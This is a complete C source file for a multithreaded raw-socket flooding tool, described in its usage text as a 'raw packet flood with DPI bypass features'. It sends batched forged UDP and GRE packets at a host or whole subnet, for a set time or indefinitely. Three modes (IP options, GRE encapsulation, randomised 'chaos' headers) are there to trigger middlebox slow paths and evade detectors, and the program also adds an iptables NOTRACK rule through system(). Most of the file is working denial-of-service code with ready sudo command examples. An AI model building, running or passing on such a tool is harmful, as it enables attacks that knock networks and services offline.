#define _GNU_SOURCE
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/types.h>
#include <netdb.h>

#define BATCH_MAX 1024

static volatile int running = 1;
static unsigned int g_mark;
static void handle_sigint(int sig) { (void)sig; running = 0; }

typedef struct {
	unsigned long long sent;
	unsigned long long bytes;
	unsigned long long errors;
	unsigned int pps_cur;
	unsigned long long bps_cur;
} stats_t;
static stats_t g_stats;

static __thread unsigned int rng_state;

static void seed_rand(unsigned int s) {
	rng_state = s * 2654435761U + 1;
}

static unsigned int get_rand(void) {
	rng_state ^= rng_state << 13;
	rng_state ^= rng_state >> 17;
	rng_state ^= rng_state << 5;
	return rng_state;
}

static void fill_rand(void *buf, size_t len) {
	unsigned char *p = buf;
	for (size_t i = 0; i < len; i++)
		p[i] = (unsigned char)get_rand();
}

static unsigned int resolve_ip(const char *host) {
	struct addrinfo *ai;
	if (getaddrinfo(host, NULL, NULL, &ai) != 0) return 0;
	unsigned int addr = ((struct sockaddr_in *)ai->ai_addr)->sin_addr.s_addr;
	freeaddrinfo(ai);
	return addr;
}

static unsigned int get_source_ip(unsigned int dst) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) return 0;
	struct sockaddr_in sin = { .sin_family = AF_INET, .sin_addr.s_addr = dst, .sin_port = htons(80) };
	if (connect(fd, (struct sockaddr *)&sin, sizeof(sin)) < 0) { close(fd); return 0; }
	struct sockaddr_in local;
	socklen_t len = sizeof(local);
	getsockname(fd, (struct sockaddr *)&local, &len);
	close(fd);
	return local.sin_addr.s_addr;
}

static int parse_cidr(const char *s, unsigned int *base, int *prefix) {
	char *slash = strchr(s, '/');
	if (!slash) return 0;
	char ip[32];
	int l = (int)(slash - s);
	if (l >= (int)sizeof(ip)) return 0;
	memcpy(ip, s, l);
	ip[l] = 0;
	if (inet_pton(AF_INET, ip, base) != 1) return 0;
	*prefix = atoi(slash + 1);
	return (*prefix >= 24 && *prefix <= 28) ? 1 : 0;
}

static inline unsigned short ip_csum(unsigned short *p)
{
	unsigned long sum = 0;
	sum += p[0]; sum += p[1]; sum += p[2]; sum += p[3]; sum += p[4];
	sum += p[5]; sum += p[6]; sum += p[7]; sum += p[8]; sum += p[9];
	while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
	return ~sum;
}

static int build_opts(unsigned char *buf, unsigned long *rng)
{
	int len;
	int r = (*rng = *rng * 1103515245U + 12345) % 100;
	if (r < 40)      len = 4;
	else if (r < 65) len = 8;
	else if (r < 80) len = 12;
	else if (r < 90) len = 20;
	else             len = 40;
	int pos = 0;
	if (len == 4) {
		buf[pos++] = 1; buf[pos++] = 1;
		buf[pos++] = 68; buf[pos++] = 4;
	} else if (len == 8) {
		buf[pos++] = 1; buf[pos++] = 1;
		buf[pos++] = 148; buf[pos++] = 4;
		buf[pos++] = 0; buf[pos++] = 0;
		buf[pos++] = 1; buf[pos++] = 1;
	} else if (len == 12) {
		buf[pos++] = 68; buf[pos++] = 8;
		buf[pos++] = 5; buf[pos++] = 0;
		buf[pos++] = 0; buf[pos++] = 0;
		buf[pos++] = 0; buf[pos++] = 0;
		buf[pos++] = 148; buf[pos++] = 4;
		buf[pos++] = 0; buf[pos++] = 0;
	} else {
		buf[pos++] = 68; buf[pos++] = 40;
		buf[pos++] = 5; buf[pos++] = 0;
		while (pos < len) buf[pos++] = (*rng = *rng * 1103515245U + 12345) & 1 ? 1 : 0;
	}
	return len;
}

static void flush_route(void) {
	int fd = open("/proc/sys/net/ipv4/route/flush", O_WRONLY);
	if (fd >= 0) { ssize_t w = write(fd, "1", 1); (void)w; close(fd); }
}

static void *worker(void *arg) {
	struct {
		unsigned int src_ip, dst_base;
		int num_hosts, dst_port, duration, pkt_len, mode;
	} *cfg = arg;
	char *mem = NULL;
	int socks[4];
	int nsocks = 4;
	for (int i = 0; i < nsocks; i++) socks[i] = -1;

	seed_rand((unsigned int)(unsigned long)pthread_self() ^ (unsigned int)time(NULL));

	int pay = cfg->pkt_len;
	if (pay < 1) pay = 1;
	int max_psz = sizeof(struct iphdr) + 40 + 8 + pay + 256;
	size_t pool = (size_t)max_psz * BATCH_MAX
		+ sizeof(struct sockaddr_in) * BATCH_MAX
		+ sizeof(struct iovec) * BATCH_MAX
		+ sizeof(struct mmsghdr) * BATCH_MAX;
	mem = malloc(pool);
	if (!mem) goto cleanup;

	char *pb = mem;
	struct sockaddr_in *ad = (struct sockaddr_in *)(pb + (size_t)max_psz * BATCH_MAX);
	struct iovec *iv = (struct iovec *)(ad + BATCH_MAX);
	struct mmsghdr *mv = (struct mmsghdr *)(iv + BATCH_MAX);

	for (int i = 0; i < nsocks; i++) {
		socks[i] = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
		if (socks[i] < 0) { perror("  [worker] socket"); goto cleanup; }
		int one = 1;
		setsockopt(socks[i], IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
		int sndbuf = 8388608;
		setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
		if (g_mark) setsockopt(socks[i], SOL_SOCKET, SO_MARK, &g_mark, sizeof(g_mark));
	}

	for (unsigned int n = 0; n < BATCH_MAX; n++) {
		iv[n].iov_len = 0;
		mv[n].msg_hdr.msg_name = &ad[n];
		mv[n].msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
		mv[n].msg_hdr.msg_iov = &iv[n];
		mv[n].msg_hdr.msg_iovlen = 1;
		ad[n].sin_family = AF_INET;
		ad[n].sin_port = htons(cfg->dst_port);
	}

	long long deadline = cfg->duration > 0
		? (long long)time(NULL) + cfg->duration
		: 0x7FFFFFFFFFFFFFFFLL;

	unsigned int sock_idx = 0;
	unsigned int base_sport = (unsigned int)(unsigned long)pthread_self();
	int mode = cfg->mode;

	while (running && time(NULL) < deadline) {
		unsigned int dst_off_base = get_rand();
		unsigned short ip_id_base = (unsigned short)get_rand();
		int n;

		for (n = 0; n < BATCH_MAX; n++) {
			unsigned int dst = cfg->dst_base + ((dst_off_base + n * 31337U) % (unsigned int)cfg->num_hosts);
			char *pkt = pb + n * max_psz;
			struct iphdr *ip = (struct iphdr *)pkt;
			unsigned int sport = ((unsigned int)(base_sport + n * 65521U) % 64511U) + 1024U;
			int tot;

			if (mode == 0) {
				int optlen = 4 + ((get_rand() % 37) / 4) * 4;
				if (optlen > 40) optlen = 40;
				unsigned long rng2 = get_rand();
				build_opts((unsigned char *)(pkt + 20), &rng2);
				int ihl = 5 + optlen / 4;
				tot = 20 + optlen + 8 + pay;
				ip->ihl = ihl;
				ip->protocol = IPPROTO_UDP;
				struct udphdr *udp = (struct udphdr *)(pkt + 20 + optlen);
				udp->source = htons(sport);
				udp->dest = htons(cfg->dst_port);
				udp->len = htons(8 + pay);
				udp->check = 0;
				if (pay > 0) {
					unsigned char *pl = (unsigned char *)(pkt + 20 + optlen + 8);
					for (int j = 0; j < pay; j++)
						pl[j] = (unsigned char)get_rand();
				}
			} else if (mode == 1) {
				ip->ihl = 5;
				ip->protocol = 47;
				tot = 20 + 4 + 8 + pay;
				pkt[20] = 0; pkt[21] = 0;
				pkt[22] = 0x08; pkt[23] = 0x00;
				struct udphdr *udp = (struct udphdr *)(pkt + 24);
				udp->source = htons(sport);
				udp->dest = htons(cfg->dst_port);
				udp->len = htons(8 + pay);
				udp->check = 0;
				if (pay > 0) {
					unsigned char *pl = (unsigned char *)(pkt + 24 + 8);
					fill_rand(pl, pay);
				}
			} else {
				int proto;
				unsigned int r = get_rand() % 100;
				if (r < 50) proto = IPPROTO_UDP;
				else if (r < 75) proto = 47;
				else proto = 2 + (get_rand() % 254);
				int optlen = 0;
				if (get_rand() % 100 < 30) {
					unsigned long rng2 = get_rand();
					optlen = build_opts((unsigned char *)(pkt + 20), &rng2);
				}
				int ihl = 5 + optlen / 4;
				int chaos_pay = proto == IPPROTO_UDP ? (get_rand() % (pay + 1)) : 0;
				tot = 20 + optlen;
				if (proto == IPPROTO_UDP) tot += 8 + chaos_pay;
				if (proto == 47) { tot += 4 + 8 + pay; chaos_pay = pay; }
				ip->ihl = ihl;
				ip->protocol = proto;
				ip->tos = (unsigned char)get_rand();
				ip->frag_off = (get_rand() % 100 < 10) ? htons(IP_MF) : 0;
				ip->ttl = 1 + (get_rand() % 254);
				if (proto == 47) {
					pkt[20 + optlen] = 0; pkt[20 + optlen + 1] = 0;
					pkt[20 + optlen + 2] = (unsigned char)get_rand();
					pkt[20 + optlen + 3] = (unsigned char)get_rand();
				}
				if (proto == IPPROTO_UDP || proto == 47) {
					int udp_off = (proto == 47) ? 20 + optlen + 4 : 20 + optlen;
					struct udphdr *udp = (struct udphdr *)(pkt + udp_off);
					udp->source = htons(sport);
					udp->dest = htons(cfg->dst_port + (get_rand() % 100));
					udp->len = htons((proto == IPPROTO_UDP) ? (8 + chaos_pay) : (8 + pay));
					udp->check = 0;
					int plen = (proto == IPPROTO_UDP) ? chaos_pay : pay;
					if (plen > 0) {
						unsigned char *pl = (unsigned char *)(pkt + udp_off + 8);
						for (int j = 0; j < plen; j++)
							pl[j] = (unsigned char)get_rand();
					}
				}
			}

			ip->version = 4;
			ip->tot_len = htons(tot);
			ip->id = htons(ip_id_base + (unsigned short)n);
			if (mode != 2) ip->ttl = 255;
			ip->saddr = cfg->src_ip;
			ip->daddr = dst;
			ip->check = 0;
			ip->check = ip_csum((unsigned short *)ip);

			ad[n].sin_addr.s_addr = dst;
			iv[n].iov_base = pkt;
			iv[n].iov_len = tot;
		}

		int sock = socks[sock_idx % (unsigned int)nsocks];
		sock_idx++;
		int off = 0;
		while (off < n) {
			int ret = sendmmsg(sock, mv + off, n - off, 0);
			if (ret > 0) {
				off += ret;
			} else if (ret == 0) {
				break;
			} else if (errno == EAGAIN || errno == EWOULDBLOCK) {
				usleep(5);
			} else {
				__sync_add_and_fetch(&g_stats.errors, 1);
				break;
			}
		}
		if (off > 0) {
			__sync_add_and_fetch(&g_stats.sent, off);
			__sync_add_and_fetch(&g_stats.bytes, (unsigned long long)off * max_psz);
		}
	}

cleanup:
	free(mem);
	for (int i = 0; i < nsocks; i++)
		if (socks[i] >= 0) close(socks[i]);
	return NULL;
}

static void fmt_bw(char *buf, size_t n, unsigned long long bps) {
	if (bps >= 1000000000ULL)
		snprintf(buf, n, "%.2f Gbps", (double)bps / 1000000000.0);
	else if (bps >= 1000000ULL)
		snprintf(buf, n, "%.2f Mbps", (double)bps / 1000000.0);
	else if (bps >= 1000ULL)
		snprintf(buf, n, "%.2f Kbps", (double)bps / 1000.0);
	else
		snprintf(buf, n, "%llu bps", bps);
}

static void *stats_loop(void *arg) {
	int show_bw = (int)(unsigned long)arg;
	unsigned long long last_pkt = 0, last_byte = 0;
	while (running) {
		sleep(2);
		flush_route();
		unsigned long long cur_pkt  = __sync_add_and_fetch(&g_stats.sent, 0);
		unsigned long long cur_byte = __sync_add_and_fetch(&g_stats.bytes, 0);
		g_stats.pps_cur = (unsigned int)((cur_pkt - last_pkt) / 2);
		g_stats.bps_cur = (cur_byte - last_byte) * 8 / 2;
		last_pkt  = cur_pkt;
		last_byte = cur_byte;
		char bw[32];
		fmt_bw(bw, sizeof(bw), g_stats.bps_cur);
		if (show_bw)
			printf("\r  %llu pkts  |  %llu err  |  %u pps  |  %s  ",
			       (unsigned long long)g_stats.sent,
			       (unsigned long long)g_stats.errors,
			       g_stats.pps_cur, bw);
		else
			printf("\r  %llu pkts  |  %llu err  |  %u pps  ",
			       (unsigned long long)g_stats.sent,
			       (unsigned long long)g_stats.errors,
			       g_stats.pps_cur);
		fflush(stdout);
	}
	printf("\n");
	return NULL;
}

static void usage(const char *name) {
	fprintf(stderr,
		"Usage: %s <target> <port> <time> [-t threads] [-l len] [-m mode]\n"
		"\n"
		"Raw packet flood with DPI bypass features.\n"
		"Target can be a CIDR subnet /24-/28 to spread across multiple IPs.\n"
		"\n"
		"Positional:\n"
		"  target        IP or CIDR subnet\n"
		"  port          UDP port\n"
		"  time          duration in seconds (0 = infinite)\n"
		"\n"
		"Options:\n"
		"  -t N          worker threads  (default 4)\n"
		"  -l N          payload bytes 0-1400 (default 0)\n"
		"  -m M          mode: ipopt (default), gre, chaos\n"
		"\n"
		"Modes:\n"
		"  ipopt    IP options (4-40B TS/RA) to trigger slow-path in middleboxes\n"
		"  gre      GRE encapsulation (proto 47) to bypass GRE-aware DPI\n"
		"  chaos    random proto/opts/ttl/tos/frag per packet to confuse detectors\n"
		"\n"
		"Examples:\n"
		"  sudo %s 10.0.0.1 53 60 -m ipopt\n"
		"  sudo %s 192.168.1.0/24 443 120 -m gre -l 200\n"
		"  sudo %s -t 8 target.com 80 0 -m chaos\n"
		, name, name, name, name);
}

int main(int argc, char **argv) {
	int threads = 4, pkt_len = 0, mode = 0, opt;
	char *mode_str = "ipopt";

	while ((opt = getopt(argc, argv, "t:l:m:h")) != -1) {
		switch (opt) {
		case 't': threads  = atoi(optarg); break;
		case 'l': pkt_len  = atoi(optarg); break;
		case 'm': mode_str = optarg; break;
		case 'h': default:  usage(argv[0]); return opt == 'h' ? 0 : 1;
		}
	}

	if (optind + 3 > argc) { usage(argv[0]); return 1; }
	const char *target = argv[optind];
	int port = atoi(argv[optind + 1]);
	int duration = atoi(argv[optind + 2]);
	if (port < 1 || port > 65535) { fprintf(stderr, "Invalid port\n"); return 1; }
	if (pkt_len < 0) pkt_len = 0;
	if (pkt_len > 1400) pkt_len = 1400;
	if (geteuid() != 0) { fprintf(stderr, "Root required for raw sockets\n"); return 1; }

	if (!strcmp(mode_str, "gre")) mode = 1;
	else if (!strcmp(mode_str, "chaos")) mode = 2;
	else mode = 0;

	unsigned int dst_base;
	int prefix, num_hosts;
	unsigned int dst_ip;
	char subnet_buf[64] = "";

	if (parse_cidr(target, &dst_base, &prefix)) {
		num_hosts = 1 << (32 - prefix);
		unsigned int h = ntohl(dst_base);
		if (prefix == 28) h &= 0xFFFFFFF0;
		else if (prefix == 27) h &= 0xFFFFFFE0;
		else if (prefix == 26) h &= 0xFFFFFFC0;
		else if (prefix == 25) h &= 0xFFFFFF80;
		else h &= 0xFFFFFF00;
		dst_base = htonl(h);
		dst_ip = dst_base;
		snprintf(subnet_buf, sizeof(subnet_buf), "%d IPs (/%d)", num_hosts, prefix);
	} else if (strchr(target, '/')) {
		fprintf(stderr, "Invalid CIDR: use /24 to /28 only\n"); return 1;
	} else {
		dst_ip = resolve_ip(target);
		if (!dst_ip) { fprintf(stderr, "Cannot resolve %s\n", target); return 1; }
		dst_base = dst_ip;
		num_hosts = 1;
	}

	unsigned int src_ip = get_source_ip(dst_ip);
	if (!src_ip) { fprintf(stderr, "Cannot determine source IP\n"); return 1; }

	struct in_addr sa = { .s_addr = src_ip }, da = { .s_addr = dst_ip };

	g_mark = (unsigned int)(get_rand() & 0xFFFF) + 1;
	if (g_mark) {
		char cmd[128];
		snprintf(cmd, sizeof(cmd),
			"iptables -t raw -I OUTPUT -m mark --mark 0x%x -j NOTRACK 2>/dev/null", g_mark);
		{ int _s = system(cmd); (void)_s; }
	}

	struct sigaction sa_sig = { .sa_handler = handle_sigint };
	sigaction(SIGINT, &sa_sig, NULL);
	sigaction(SIGTERM, &sa_sig, NULL);

	const char *mode_names[] = { "ipopt", "gre", "chaos" };
	printf(
		"  Target:   %s:%d\n"
		"  Subnet:   %s\n"
		"  Source:   %s\n"
		"  Threads:  %d\n"
		"  Payload:  %d B\n"
		"  Mode:     %s\n"
		"  Duration: %ds\n"
		"  Batch:    1024 (sendmmsg)\n"
		"  Buffer:   16MB SO_SNDBUF\n"
		"  Sockets:  4x RAW per thread\n"
		"  Bypass:   %s\n"
		"  Press Ctrl+C to stop\n\n",
		inet_ntoa(da), port, subnet_buf[0] ? subnet_buf : "single host",
		inet_ntoa(sa), threads, pkt_len,
		mode_names[mode],
		duration > 0 ? duration : 0,
		mode == 0 ? "IP options (slow-path trigger)" :
		mode == 1 ? "GRE encapsulation" :
		"random proto/opts/ttl/tos/frag");

	struct {
		unsigned int src_ip, dst_base;
		int num_hosts, dst_port, duration, pkt_len, mode;
	} cfg = { src_ip, dst_base, num_hosts, port, duration, pkt_len, mode };

	pthread_t stat_tid;
	pthread_create(&stat_tid, NULL, stats_loop, (void*)(unsigned long)(pkt_len > 40 ? 1 : 0));

	pthread_t *tids = malloc(sizeof(pthread_t) * threads);
	for (int i = 0; i < threads; i++)
		pthread_create(&tids[i], NULL, worker, &cfg);
	for (int i = 0; i < threads; i++)
		pthread_join(tids[i], NULL);

	running = 0;
	pthread_join(stat_tid, NULL);
	free(tids);

	if (g_mark) {
		char cmd[128];
		snprintf(cmd, sizeof(cmd),
			"iptables -t raw -D OUTPUT -m mark --mark 0x%x -j NOTRACK 2>/dev/null", g_mark);
		{ int _s = system(cmd); (void)_s; }
	}

	printf("\n  Final: %llu pkts, %llu bytes, %llu errors\n",
	       (unsigned long long)g_stats.sent,
	       (unsigned long long)g_stats.bytes,
	       (unsigned long long)g_stats.errors);
	return 0;
}
